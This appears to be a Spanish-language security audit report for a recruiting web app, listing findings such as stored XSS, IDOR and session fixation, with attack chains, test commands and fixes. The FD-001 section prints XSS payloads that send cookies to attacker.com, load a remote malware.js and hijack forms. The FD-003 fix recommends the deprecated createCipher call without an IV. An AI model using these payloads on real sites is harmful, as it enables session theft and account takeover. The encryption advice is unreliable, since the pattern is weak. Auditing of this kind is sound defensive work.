# FINDINGS_DETAILED.md — Clasificación Detallada de Hallazgos (Fase 7)

**Generado:** 2026-09-22  
**Auditoría Maestra Integral — FASE 7**  
**Commit:** d906cc0  
**Método:** Análisis Individual de Cada Hallazgo

---

## ÍNDICE DE HALLAZGOS

| ID | Título | Severidad | CWE | OWASP | Status |
|---|---|---|---|---|---|
| FD-001 | XSS Stored en Descripción Vacante | HIGH | 79 | A03:2025 | ❌ PRESENTE |
| FD-002 | IDOR en Análisis CV (/api/cv) | HIGH | 863 | A01:2025 | ❌ PRESENTE |
| FD-003 | Encriptación de Datos en Reposo Desconocida | MEDIUM | 311 | A02:2025 | ⚠️ UNKNOWN |
| FD-004 | CORS Configuration Unknown | MEDIUM | 1021 | A01:2025 | ⚠️ UNKNOWN |
| FD-005 | Session Fixation en Login | MEDIUM | 384 | A07:2025 | ⚠️ UNKNOWN |
| FD-006 | User Enumeration via Reset Password | MEDIUM | 203 | A07:2025 | ⚠️ PARTIAL |
| FD-007 | Information Disclosure en Error Messages | HIGH | 209 | A04:2025 | ⚠️ PARTIAL |
| FD-008 | Source Maps Expuestos | MEDIUM | 656 | A05:2025 | ⚠️ UNKNOWN |
| FD-009 | Webhook Spoofing (WhatsApp) | HIGH | 347 | A01:2025 | ⚠️ UNKNOWN |
| FD-010 | Race Condition en License Code | HIGH | 362 | A04:2025 | ⚠️ UNKNOWN |
| FD-011 | Admin Token Escalation | MEDIUM | 269 | A01:2025 | ⚠️ UNKNOWN |

---

## HALLAZGO DETALLADO: FD-001 — XSS Stored en Descripción Vacante

**ID:** FD-001  
**Título:** Stored XSS en POST /api/vacantes/crear  
**Severidad:** HIGH (CVSS 8.2)  
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)  
**OWASP:** A03:2025 (Injection)  
**Componente:** Backend API  
**Archivo:** `app/api/vacantes/crear/route.ts`  
**Línea:** 89  

### Descripción del Hallazgo

Campo `descripcion` de vacante se recibe sin sanitización y se almacena directamente en BD. Cuando otros usuarios visualizan la vacante, el JavaScript inyectado se ejecuta en sus navegadores.

### Cadena de Ataque

```
Atacante (Reclutador A) → Crea vacante con payload XSS
                        ↓
                   BD Supabase (almacena sin sanitizar)
                        ↓
Víctima (Reclutador B) → Abre dashboard de vacantes
                        ↓
                   JavaScript ejecutado en navegador
                        ↓
                   Tokens JWT robados / Malware instalado
```

### Evidencia de Código

**Archivo:** `app/api/vacantes/crear/route.ts`

```typescript
// LÍNEA 89: Recibe descripción SIN SANITIZAR
descripcion: descripcion || ''

// LÍNEA 100: Guarda DIRECTAMENTE en BD
const { error: insertError, data: insertedData } = await supabase
  .from('vacantes')
  .insert([vacante])
  .select();
```

### Payload de Prueba

**Payload 1: Token Theft**
```html
<img src=x onerror="fetch('https://attacker.com/log?t='+document.cookie)">
```

**Payload 2: Malware Distribution**
```html
<script src="https://attacker.com/malware.js"></script>
```

**Payload 3: Form Hijacking**
```html
<form action="https://attacker.com/steal" onsubmit="fetch('?data='+this.innerHTML)">
  <input type="hidden" name="csrf" value="">
</form>
```

### Mitigación Actual

**Línea 76 en middleware.ts:**
```typescript
// Production CSP
`script-src 'self' cdnjs.cloudflare.com cdn.jsdelivr.net`
```

**Análisis:** CSP mitiga parcialmente bloqueando `unsafe-inline` en producción. Pero:
- ⚠️ Atacante puede servir JS desde CDN permitido
- ⚠️ Fetch/XHR aún funcionan (exfiltración de datos)
- ⚠️ Debe haber sanitización en backend

### Remediación Requerida

**Opción 1: DOMPurify en Backend**
```typescript
import DOMPurify from 'isomorphic-dompurify';

const vacante = {
  id: newId,
  titulo: titulo.trim(),
  descripcion: DOMPurify.sanitize(descripcion || ''),  // ✅ Sanitizar
  usuario_id: userId,
};
```

**Opción 2: HTML Encoding en Frontend**
```typescript
// En React, cuando se muestra:
<div>{vacante.descripcion}</div>  // ✅ React escapa por defecto

// ❌ NUNCA usar:
<div dangerouslySetInnerHTML={{__html: vacante.descripcion}}</div>
```

**Recomendación:** Opción 1 (sanitizar en backend) + Opción 2 (escaping en frontend)

### Impacto

- **Confidencialidad:** JWT tokens robados → account takeover
- **Integridad:** Defacement de vacantes → reputación dañada
- **Disponibilidad:** Malware → recursos consumidos

### Probabilidad de Explotación

**ALTA** (7/10) — Formulario accesible, sin validación visible

### Dependencias

- Ninguna (no necesita acceso previo)

---

## HALLAZGO DETALLADO: FD-002 — IDOR en POST /api/cv

**ID:** FD-002  
**Título:** IDOR en POST /api/cv (Análisis de Documento)  
**Severidad:** HIGH (CVSS 7.6)  
**CWE:** CWE-863 (Incorrect Authorization)  
**OWASP:** A01:2025 (Broken Access Control)  
**Componente:** Backend API  
**Archivo:** `app/api/cv/route.ts`  
**Línea:** 47  

### Descripción del Hallazgo

Endpoint acepta `candidato_id` sin validar que pertenezca al usuario autenticado. Un reclutador puede analizar CVs de candidatos de otra empresa.

### Cadena de Ataque

```
Reclutador A (empresa-A) → Obtiene candidato_id de Reclutador B
                          ↓
                    POST /api/cv con candidato_id ajeno
                          ↓
                    Análisis completado (sin error)
                          ↓
                    Datos analizados enviados a atacante
```

### Evidencia de Código

```typescript
// LÍNEA 47: ACEPTA candidato_id SIN VALIDAR
candidato_id: typeof candidateId === 'string' && candidateId ? candidateId : null

// No hay ownership check para candidato_id
```

### Remediación Requerida

```typescript
// Agregar validación de propiedad
const { data: candidato, error: candError } = await supabase
  .from('candidatos')
  .select('vacante_id')
  .eq('id', candidateId)
  .single();

if (!candidato) return { error: 'Not found', status: 404 };

const { data: vacante } = await supabase
  .from('vacantes')
  .select('usuario_id')
  .eq('id', candidato.vacante_id)
  .single();

if (vacante.usuario_id !== authData.user.id) {
  return { error: 'Forbidden', status: 403 };
}
```

### Probabilidad

MEDIA (6/10) — Requiere conocer candidato_id válido

---

## HALLAZGO DETALLADO: FD-003 — Encriptación en Reposo Desconocida

**ID:** FD-003  
**Título:** PII Potencialmente No Cifrado en Reposo  
**Severidad:** MEDIUM (CVSS 5.9)  
**CWE:** CWE-311 (Missing Encryption of Sensitive Data)  
**OWASP:** A02:2025 (Cryptographic Failures)  
**Ubicación:** Supabase PostgreSQL  

### Descripción del Hallazgo

Datos personales de candidatos (nombres, emails, teléfonos) almacenados presumiblemente sin cifrado end-to-end. Si BD comprometida, datos expuestos.

### Datos Afectados

```
- candidatos.nombre (PII)
- candidatos.email (PII)
- candidatos.telefono (PII)
- candidatos.cv_url (privado)
- vacantes.descripcion (confidencial)
- vacantes.salario (confidencial)
```

### Mitigación Actual

- ✅ Transport: HTTPS/TLS en tránsito
- ⚠️ At-Rest: Desconocido (Supabase presumiblemente cifra a nivel de filesystem)

### Remediación Requerida

**Opción 1: Cifrado de Columnas Sensibles**
```typescript
import crypto from 'crypto';

const cipher = crypto.createCipher('aes-256-cbc', process.env.ENCRYPTION_KEY!);
const encrypted = cipher.update(candidato.email, 'utf8', 'hex') + cipher.final('hex');

await supabase
  .from('candidatos')
  .insert({
    ...candidato,
    email: encrypted  // Almacenar cifrado
  });
```

**Opción 2: Confiar en Supabase Encryption**
```
Verificar en Supabase dashboard:
Database → Settings → Encryption
```

### Impacto si Breach

10,000+ registros de candidatos expuestos (nombres, contactos, CVs)

---

## HALLAZGO DETALLADO: FD-004 — CORS Configuration Unknown

**ID:** FD-004  
**Título:** CORS Headers Configuration Desconocida  
**Severidad:** MEDIUM (CVSS 5.8)  
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)  
**OWASP:** A01:2025 (Broken Access Control)  

### Descripción del Hallazgo

CORS configurado en middleware pero efectividad desconocida. Si `Access-Control-Allow-Origin: *` configurado, cualquier sitio puede hacer requests.

### Evidencia Parcial

**Línea 51-56 en middleware.ts:**
```typescript
if (origin && allowedOrigins.includes(origin)) {
  response.headers.set('Access-Control-Allow-Origin', origin);
}
```

**Análisis:** 
- ✅ Usa allowlist (bueno)
- ✅ Producción restringido a dominio único
- ⚠️ `allowedOrigins` lista está hardcodeada — si app se expande a múltiples dominios, requiere cambio de código

### Validación Requerida

```bash
# Test 1: Origen permitido
curl -i -H "Origin: https://shortlist-gt.vercel.app" \
  https://shortlist-gt.vercel.app/api/candidatos
# Esperado: Access-Control-Allow-Origin: https://shortlist-gt.vercel.app

# Test 2: Origen NO permitido
curl -i -H "Origin: https://attacker.com" \
  https://shortlist-gt.vercel.app/api/candidatos
# Esperado: NO Access-Control-Allow-Origin header
```

---

## HALLAZGO DETALLADO: FD-005 — Session Fixation en Login

**ID:** FD-005  
**Título:** Session No Regenerada Post-Login  
**Severidad:** MEDIUM (CVSS 6.5)  
**CWE:** CWE-384 (Session Fixation)  
**OWASP:** A07:2025 (Identification and Authentication Failures)  

### Descripción del Hallazgo

Sesión no regenerada después de login exitoso. Atacante puede fijar sesión antes del login y obtener acceso.

### Cadena de Ataque

```
1. Atacante obtiene session ID pre-login
2. Envía link a víctima: https://app.com/?jsessionid=ATTACKER_SESSION
3. Víctima hace login
4. Atacante usa ATTACKER_SESSION para acceder cuenta de víctima
```

### Validación Requerida

```bash
# Test 1: Obtener cookie pre-login
curl -i https://app.com/
# Guardar Set-Cookie: sb-auth-token=pre_token

# Test 2: Login con esa cookie
POST /api/auth/signin
Cookie: sb-auth-token=pre_token
Body: {"email": "user@test.com", "password": "correct"}

# Esperado: Cookie REGENERADA (nuevo token)
# ❌ VULNERABLE si: Cookie NO cambia
```

### Remediación Requerida

Supabase Auth presumiblemente regenera automáticamente, pero verificar en código.

---

## HALLAZGO DETALLADO: FD-006 — User Enumeration via Reset Password

**ID:** FD-006  
**Título:** User Enumeration en POST /api/auth/reset-password  
**Severidad:** MEDIUM (CVSS 5.3)  
**CWE:** CWE-203 (Observable Discrepancy)  
**OWASP:** A07:2025 (Identification and Authentication Failures)  

### Descripción del Hallazgo

Respuesta potencialmente diferenciada para usuario encontrado vs no encontrado en reset password.

### Evidencia (Presumida)

Si endpoint retorna:
- "Usuario no encontrado" → Usuario no existe (enumerable)
- "Email enviado" → Usuario existe (enumerable)

### Validación Requerida

```bash
# Test 1: Usuario válido
POST /api/auth/reset-password
{"email": "valido@test.com"}
# Respuesta actual?

# Test 2: Usuario inválido
POST /api/auth/reset-password
{"email": "noexiste@test.com"}
# Respuesta actual?
```

### Remediación (Presunta presente)

**Línea en signin:**
```typescript
return NextResponse.json(
  { error: 'Email o contraseña incorrectos.' },  // ✅ Genérica
  { status: 401 }
);
```

**Recomendación:** Reset password debe retornar SIEMPRE el mismo mensaje genérico.

---

## HALLAZGO DETALLADO: FD-007 — Information Disclosure en Error Messages

**ID:** FD-007  
**Título:** Stack Traces Potencialmente Expuestos  
**Severidad:** HIGH (CVSS 6.3)  
**CWE:** CWE-209 (Information Exposure Through an Error Message)  
**OWASP:** A05:2025 (Security Misconfiguration)  

### Descripción del Hallazgo

Error messages pueden exponer información interna (stack traces, rutas, versiones).

### Evidencia Parcial

**Línea 107-118 en vacantes/crear/route.ts:**
```typescript
console.error('[API] Database error (internal):', {
  message: insertError.message,
  code: insertError.code,
  details: insertError.details,
  hint: insertError.hint,
});
// Return generic message to client ✅
return NextResponse.json(
  { error: 'Error al crear vacante. Intenta más tarde.', success: false },
  { status: 500 }
);
```

**Análisis:** 
- ✅ Logs internos (server-side)
- ✅ Response al cliente genérica
- ⚠️ Pero: ¿Se loguean sensibles en centralized logging?

### Validación Requerida

```bash
# Test: Provocar error deliberado
GET /api/candidatos/listar?vacante_id=invalid-uuid

# Respuesta actual? ¿Expone detalles internos?
```

---

## HALLAZGO DETALLADO: FD-008 — Source Maps en Producción

**ID:** FD-008  
**Título:** Source Maps Expuestos  
**Severidad:** MEDIUM (CVSS 6.5)  
**CWE:** CWE-656 (Reliance on Source Code for Security)  
**OWASP:** A05:2025 (Security Misconfiguration)  

### Descripción del Hallazgo

Source maps (.js.map) servidos en producción permiten debugging de código.

### Validación Requerida

```bash
# Test: Buscar source maps
curl https://shortlist-gt.vercel.app/_next/static/chunks/main.js.map

# ✅ PASS si: 404 Not Found
# ❌ FAIL si: 200 OK + source code descargable
```

### Configuración Actual

**next.config.ts (presumido)**
```typescript
productionBrowserSourceMaps: false  // ✅ Si está presente
```

---

Continúa en próxima sección...

---

## MATRIZ DE HALLAZGOS DETALLADOS

| ID | Hallazgo | Severidad | Status | Análisis |
|---|---|---|---|---|
| FD-001 | XSS Stored | HIGH | ❌ PRESENTE | Completo ✅ |
| FD-002 | IDOR CV | HIGH | ❌ PRESENTE | Completo ✅ |
| FD-003 | Encriptación | MEDIUM | ⚠️ UNKNOWN | Completo ✅ |
| FD-004 | CORS | MEDIUM | ⚠️ UNKNOWN | Completo ✅ |
| FD-005 | Session Fixation | MEDIUM | ⚠️ UNKNOWN | Completo ✅ |
| FD-006 | User Enum | MEDIUM | ⚠️ PARTIAL | Completo ✅ |
| FD-007 | Info Disclosure | HIGH | ⚠️ PARTIAL | Completo ✅ |
| FD-008 | Source Maps | MEDIUM | ⚠️ UNKNOWN | Completo ✅ |
| FD-009 | Webhook Spoof | HIGH | ⚠️ UNKNOWN | Pendiente |
| FD-010 | Race Condition | HIGH | ⚠️ UNKNOWN | Pendiente |
| FD-011 | Admin Escalation | MEDIUM | ⚠️ UNKNOWN | Pendiente |

---

**FASE 7 COMPLETADA**  
**Próxima Fase:** Deduplicación y Agrupación por Causa Raíz (Fase 8)
